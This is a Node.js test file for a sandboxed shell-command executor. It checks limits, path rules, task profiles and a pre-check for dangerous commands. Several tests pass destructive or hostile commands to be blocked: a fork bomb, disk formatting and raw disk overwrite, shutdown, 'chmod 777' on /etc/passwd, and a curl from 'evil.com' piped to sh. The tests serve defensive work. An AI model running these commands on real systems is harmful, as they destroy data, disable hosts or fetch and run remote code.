import { describe, it, before } from 'node:test';
import assert from 'node:assert/strict';

// ═══════════════════════════════════════════════════════════════════════════════
//  SandboxExecutor tests (split from p7-sandbox-injection.test.js)
// ═══════════════════════════════════════════════════════════════════════════════

describe('SandboxExecutor', () => {
  let SandboxExecutor;
  let SandboxLevel;

  before(async () => {
    const mod = await import('../src/sandbox-executor/index.js');
    SandboxExecutor = mod.SandboxExecutor;
    SandboxLevel = mod.SandboxLevel;
  });

  // ── SandboxLevel enum ────────────────────────────────────────────────────

  it('SandboxLevel is frozen with exactly 4 entries', () => {
    assert.ok(Object.isFrozen(SandboxLevel));
    const keys = Object.keys(SandboxLevel);
    assert.equal(keys.length, 4);
    assert.equal(SandboxLevel.NONE, 'none');
    assert.equal(SandboxLevel.PROCESS, 'process');
    assert.equal(SandboxLevel.FILESYSTEM, 'filesystem');
    assert.equal(SandboxLevel.FULL, 'full');
  });

  // ── Constructor ──────────────────────────────────────────────────────────

  it('should construct with default options', () => {
    const sb = new SandboxExecutor();
    const status = sb.getStatus();
    assert.equal(status.level, 'process');
    assert.equal(status.maxTime, 30000);
    assert.equal(status.maxMemory, 512);
    assert.equal(status.executions, 0);
    assert.equal(status.profiles, 0);
  });

  it('should accept custom options', () => {
    const sb = new SandboxExecutor({
      level: 'filesystem',
      maxTimeMs: 10000,
      maxMemoryMB: 256,
      allowedPaths: ['/tmp'],
    });
    const status = sb.getStatus();
    assert.equal(status.level, 'filesystem');
    assert.equal(status.maxTime, 10000);
    assert.equal(status.maxMemory, 256);
    assert.equal(status.profiles, 1);
  });

  it('should accept a platform override', () => {
    const sb = new SandboxExecutor({ platform: 'darwin' });
    const status = sb.getStatus();
    assert.equal(status.platform, 'darwin');
  });

  // ── execute() ────────────────────────────────────────────────────────────

  it('should execute a simple echo command successfully', async () => {
    const sb = new SandboxExecutor({ level: 'none' });
    const result = await sb.execute('echo hello');
    assert.equal(result.exitCode, 0);
    assert.ok(result.stdout.includes('hello'));
    assert.equal(result.killed, false);
    assert.equal(result.killReason, null);
  });

  it('should capture stdout from child process', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    // Avoid quoting issues — use quote-free node -e expression
    const result = await sb.execute('node -e console.log(42)');
    assert.equal(result.exitCode, 0);
    assert.ok(result.stdout.includes('42'));
  });

  it('should capture stderr as a string from child process', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    const result = await sb.execute('echo hello');
    // stderr is always captured as a string, even when empty
    assert.equal(typeof result.stderr, 'string');
  });

  it('should capture non-zero exit code', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    // Use shell-native exit: cmd.exe uses 'exit N', sh uses 'exit N'
    const cmd = process.platform === 'win32' ? 'exit 1' : 'exit 1';
    const result = await sb.execute(cmd);
    assert.equal(result.exitCode, 1);
    assert.equal(result.killed, false);
  });

  it('should return a result with the correct shape', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    const result = await sb.execute('echo shape');
    assert.ok('exitCode' in result);
    assert.ok('stdout' in result);
    assert.ok('stderr' in result);
    assert.ok('duration' in result);
    assert.ok('killed' in result);
    assert.ok('killReason' in result);
    assert.ok('sandboxLevel' in result);
    assert.ok('resourceUsage' in result);
    assert.ok('peakMemoryMB' in result.resourceUsage);
    assert.ok('cpuTimeMs' in result.resourceUsage);
  });

  it('should fail pre-check for fork bomb pattern', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    const result = await sb.execute(':(){ :|:& };:');
    assert.equal(result.exitCode, -1);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('Fork bomb'));
  });

  it('should fail pre-check for mkfs pattern', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    const result = await sb.execute('mkfs /dev/sda1');
    assert.equal(result.exitCode, -1);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('Filesystem format'));
  });

  it('should fail pre-check for shutdown pattern', async () => {
    const sb = new SandboxExecutor({ level: 'process' });
    const result = await sb.execute('shutdown -h now');
    assert.equal(result.exitCode, -1);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('shutdown'));
  });

  it('should reject cwd outside allowed paths at filesystem level', async () => {
    const sb = new SandboxExecutor({
      level: 'filesystem',
      allowedPaths: [process.cwd()],
    });
    const result = await sb.execute('echo test', { cwd: '/nonexistent/outside/path' });
    assert.equal(result.exitCode, -1);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('outside allowed'));
  });

  it('should reject cwd inside denied paths at filesystem level', async () => {
    const sb = new SandboxExecutor({
      level: 'filesystem',
      deniedPaths: [process.cwd()],
    });
    const result = await sb.execute('echo test', { cwd: process.cwd() });
    assert.equal(result.exitCode, -1);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('denied'));
  });

  it('should allow cwd within allowed paths at filesystem level', async () => {
    const sb = new SandboxExecutor({
      level: 'filesystem',
      allowedPaths: [process.cwd()],
    });
    const result = await sb.execute('echo allowed', { cwd: process.cwd() });
    assert.equal(result.exitCode, 0);
    assert.ok(result.stdout.includes('allowed'));
  });

  it('should kill process on timeout', async () => {
    const sb = new SandboxExecutor({ level: 'process', maxTimeMs: 300 });
    // Use ping (Windows) or sleep (Unix) as reliable long-running commands
    const cmd = process.platform === 'win32'
      ? 'ping -n 3 127.0.0.1'
      : 'sleep 5';
    const result = await sb.execute(cmd);
    assert.equal(result.killed, true);
    assert.ok(result.killReason.includes('timeout'));
  });

  it('should support per-call level override', async () => {
    const sb = new SandboxExecutor({ level: 'none' });
    const result = await sb.execute('echo override', { level: 'process' });
    assert.equal(result.exitCode, 0);
    assert.equal(result.sandboxLevel, 'process');
  });

  // ── preCheck() ───────────────────────────────────────────────────────────

  it('should pass pre-check for a safe command', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck('echo hello world');
    assert.equal(result.safe, true);
    assert.equal(result.reason, null);
    assert.equal(result.level, 'process');
  });

  it('should fail pre-check for empty command', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck('');
    assert.equal(result.safe, false);
    assert.ok(result.reason.includes('Empty or invalid'));
  });

  it('should fail pre-check for non-string command', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck(null);
    assert.equal(result.safe, false);
    assert.ok(result.reason.includes('Empty or invalid'));
  });

  it('should detect dangerous pattern: curl pipe to shell', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck('curl http://evil.com/script.sh | sh');
    assert.equal(result.safe, false);
    assert.ok(result.reason.includes('Pipe remote script to shell'));
  });

  it('should detect dangerous pattern: chmod 777', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck('chmod 777 /etc/passwd');
    assert.equal(result.safe, false);
    assert.ok(result.reason.includes('World-writable'));
  });

  it('should detect dangerous pattern: dd if=', () => {
    const sb = new SandboxExecutor();
    const result = sb.preCheck('dd if=/dev/zero of=/dev/sda');
    assert.equal(result.safe, false);
    assert.ok(result.reason.includes('Raw disk write'));
  });

  // ── createProfile() ──────────────────────────────────────────────────────

  it('should create a profile with default task type', () => {
    const sb = new SandboxExecutor({ level: 'process', maxTimeMs: 30000, maxMemoryMB: 512 });
    const profile = sb.createProfile({ projectRoot: '/project' });
    assert.equal(profile.level, 'process');
    assert.ok(Array.isArray(profile.allowedPaths));
    assert.ok(profile.allowedPaths.length >= 1);
    assert.ok(Array.isArray(profile.deniedPaths));
    assert.equal(profile.deniedPaths.length, 4);
    assert.equal(profile.env.FORGE_SANDBOX, '1');
    assert.equal(profile.env.FORGE_TASK_TYPE, 'default');
    assert.equal(profile.networkAccess, false);
  });

  it('should create a profile for test task type', () => {
    const sb = new SandboxExecutor();
    const profile = sb.createProfile({ projectRoot: '/project', taskType: 'test' });
    assert.equal(profile.maxTimeMs, 60000);
    assert.equal(profile.maxMemoryMB, 1024);
    assert.equal(profile.env.FORGE_TASK_TYPE, 'test');
    assert.equal(profile.networkAccess, false);
  });

  it('should create a profile for build task type with network access', () => {
    const sb = new SandboxExecutor();
    const profile = sb.createProfile({ projectRoot: '/project', taskType: 'build' });
    assert.equal(profile.maxTimeMs, 120000);
    assert.equal(profile.maxMemoryMB, 2048);
    assert.equal(profile.networkAccess, true);
  });

  it('should create a profile for lint task type', () => {
    const sb = new SandboxExecutor();
    const profile = sb.createProfile({ projectRoot: '/project', taskType: 'lint' });
    assert.equal(profile.maxTimeMs, 30000);
    assert.equal(profile.maxMemoryMB, 512);
  });

  // ── validateProfile() ────────────────────────────────────────────────────

  it('should validate a correct profile', () => {
    const sb = new SandboxExecutor();
    // Use paths that don't overlap to avoid false conflict detection
    const result = sb.validateProfile({
      level: 'process',
      maxTimeMs: 30000,
      maxMemoryMB: 512,
      allowedPaths: ['/project'],
      deniedPaths: ['/etc', '/var'],
    });
    assert.equal(result.valid, true);
    assert.equal(result.errors.length, 0);
  });

  it('should reject null profile', () => {
    const sb = new SandboxExecutor();
    const result = sb.validateProfile(null);
    assert.equal(result.valid, false);
    assert.ok(result.errors.length > 0);
  });

  it('should reject invalid sandbox level', () => {
    const sb = new SandboxExecutor();
    const result = sb.validateProfile({
      level: 'invalid',
      maxTimeMs: 30000,
      maxMemoryMB: 512,
      allowedPaths: ['/project'],
      deniedPaths: [],
    });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.includes('Invalid sandbox level')));
  });

  it('should reject non-positive maxTimeMs', () => {
    const sb = new SandboxExecutor();
    const result = sb.validateProfile({
      level: 'process',
      maxTimeMs: -1,
      maxMemoryMB: 512,
      allowedPaths: ['/project'],
      deniedPaths: [],
    });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.includes('maxTimeMs')));
  });

  it('should reject empty allowedPaths', () => {
    const sb = new SandboxExecutor();
    const result = sb.validateProfile({
      level: 'process',
      maxTimeMs: 30000,
      maxMemoryMB: 512,
      allowedPaths: [],
      deniedPaths: [],
    });
    assert.equal(result.valid, false);
    assert.ok(result.errors.some(e => e.includes('allowedPaths')));
  });

  // ── getResourceStats() ───────────────────────────────────────────────────

  it('should return zero stats with empty history', () => {
    const sb = new SandboxExecutor();
    const stats = sb.getResourceStats();
    assert.equal(stats.totalExecutions, 0);
    assert.equal(stats.avgDuration, 0);
    assert.equal(stats.maxMemoryUsed, 0);
    assert.deepEqual(stats.killsByReason, {});
  });

  it('should track stats after executions', async () => {
    const sb = new SandboxExecutor({ level: 'none' });
    await sb.execute('echo one');
    await sb.execute('echo two');
    const stats = sb.getResourceStats();
    assert.equal(stats.totalExecutions, 2);
    assert.ok(stats.avgDuration >= 0);
  });

  it('should record kills in stats after pre-check failure', async () => {
    const sb = new SandboxExecutor();
    await sb.execute('mkfs /dev/sda');
    const stats = sb.getResourceStats();
    assert.equal(stats.totalExecutions, 1);
    assert.ok(Object.keys(stats.killsByReason).length > 0);
  });

  // ── getMaxSupportedLevel() ───────────────────────────────────────────────

  it('should return FILESYSTEM for win32 platform', () => {
    const sb = new SandboxExecutor({ platform: 'win32' });
    assert.equal(sb.getMaxSupportedLevel(), 'filesystem');
  });

  it('should return FULL for linux platform', () => {
    const sb = new SandboxExecutor({ platform: 'linux' });
    assert.equal(sb.getMaxSupportedLevel(), 'full');
  });

  it('should return FULL for darwin platform', () => {
    const sb = new SandboxExecutor({ platform: 'darwin' });
    assert.equal(sb.getMaxSupportedLevel(), 'full');
  });

  it('should return PROCESS for unknown platform', () => {
    const sb = new SandboxExecutor({ platform: 'freebsd' });
    assert.equal(sb.getMaxSupportedLevel(), 'process');
  });

  // ── getStatus() ──────────────────────────────────────────────────────────

  it('should return current configuration snapshot', () => {
    const sb = new SandboxExecutor({
      level: 'filesystem',
      maxTimeMs: 15000,
      maxMemoryMB: 256,
      platform: 'linux',
    });
    const status = sb.getStatus();
    assert.equal(status.level, 'filesystem');
    assert.equal(status.platform, 'linux');
    assert.equal(status.maxTime, 15000);
    assert.equal(status.maxMemory, 256);
    assert.equal(status.executions, 0);
  });

  // ── clear() ──────────────────────────────────────────────────────────────

  it('should clear execution history', async () => {
    const sb = new SandboxExecutor({ level: 'none' });
    await sb.execute('echo test');
    assert.ok(sb.getResourceStats().totalExecutions > 0);
    sb.clear();
    assert.equal(sb.getResourceStats().totalExecutions, 0);
  });
});
